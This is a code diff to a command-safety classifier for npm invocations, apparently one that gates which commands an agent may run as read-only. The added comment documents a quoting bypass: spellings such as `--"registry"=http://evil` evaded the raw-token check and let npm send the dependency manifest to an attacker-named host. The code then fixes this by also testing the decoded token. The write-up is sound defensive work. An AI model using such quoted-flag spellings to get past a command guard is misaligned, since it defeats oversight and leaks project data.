@@ -457,6 +457,21 @@ const NPM_READ_ONLY_SUBS: ReadonlySet<string> = new Set([
  * no trace in the argv this classifier inspects. Do not read this guard
  * as "npm's registry source is verified"; it only denies the on-the-spot
  * CLI override.
+ *
+ * Quoting bypass (task 2dfdf472, measured against bash's own quote
+ * removal): the RAW-token-only shape below was defeated the same way
+ * `FIND_WRITE_FLAGS` was — `npm audit --"registry"=http://evil`,
+ * `--reg"istry"=`, `--"userconfig"=`, and the scoped `--"@myorg:registry"=`
+ * spelling all decode to the real flag while none of the RAW tokens
+ * matches `NPM_REGISTRY_FLAG_RE` or the untrusted-flag set, so the
+ * unfixed guard let each one keep the read-only floor while npm actually
+ * sent the dependency manifest to the attacker-named host. Every other
+ * write/danger guard in this file already tests raw-OR-decoded
+ * (`isOutputWriteToken`, `isSortWriteToken`, `isFileWriteToken`,
+ * `FIND_WRITE_FLAGS`, `isGitDangerousToken`, `isBranchWriteFlag`,
+ * `ENV_SPLIT_STRING_FLAGS`); this guard had not been brought into that
+ * convention. Fixed the same way: decoding can only ADD a match, never
+ * remove one, so testing raw OR decoded is monotone by construction.
  */
 const NPM_REGISTRY_FLAG_RE = /^--(@[^:]+:)?registry(=|$)/;
 const NPM_UNSCOPED_UNTRUSTED_FLAGS: ReadonlySet<string> = new Set([
@@ -465,10 +480,15 @@ const NPM_UNSCOPED_UNTRUSTED_FLAGS: ReadonlySet<string> = new Set([
 
 function hasNpmUntrustedSourceFlag(tokens: readonly string[]): boolean {
   return tokens.some(
-    (t) =>
-      NPM_REGISTRY_FLAG_RE.test(t) ||
-      NPM_UNSCOPED_UNTRUSTED_FLAGS.has(t) ||
-      [...NPM_UNSCOPED_UNTRUSTED_FLAGS].some((f) => t.startsWith(`${f}=`)),
+    (t) => checkNpmUntrustedSourceFlag(t) || checkNpmUntrustedSourceFlag(decodeShellWord(t)),
+  );
+}
+
+function checkNpmUntrustedSourceFlag(t: string): boolean {
+  return (
+    NPM_REGISTRY_FLAG_RE.test(t) ||
+    NPM_UNSCOPED_UNTRUSTED_FLAGS.has(t) ||
+    [...NPM_UNSCOPED_UNTRUSTED_FLAGS].some((f) => t.startsWith(`${f}=`))
   );
 }
 
